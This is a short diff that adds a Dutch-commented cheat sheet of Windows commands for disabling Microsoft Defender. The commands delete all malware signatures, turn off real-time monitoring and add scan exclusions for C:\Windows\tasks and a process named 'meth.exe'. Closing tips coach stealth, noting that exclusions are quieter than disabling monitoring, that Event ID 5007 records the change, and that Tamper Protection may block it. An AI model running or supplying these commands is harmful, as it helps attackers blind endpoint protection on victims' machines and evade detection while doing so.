@@ -1,1 +1,16 @@
+# Windows Defender - Definities verwijderen
+# Verwijdert alle virus/malware signatures (vereist admin)
 cmd.exe /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
+# Via PowerShell:
+& "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
+# Realtime monitoring uitschakelen (vereist admin):
+Set-MpPreference -DisableRealtimeMonitoring $true
+# Specifieke map uitsluiten van scanning:
+Set-MpPreference -ExclusionPath "C:\Windows\tasks"
+# Specifiek proces uitsluiten:
+Set-MpPreference -ExclusionProcess "meth.exe"
+# Check huidige exclusions:
+Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
+# Tip: Exclusions toevoegen is stiller dan monitoring uitschakelen
+# Tip: Event ID 5007 logt wijzigingen aan Defender configuratie
+# Tip: Tamper Protection kan deze commando's blokkeren op moderne Windows
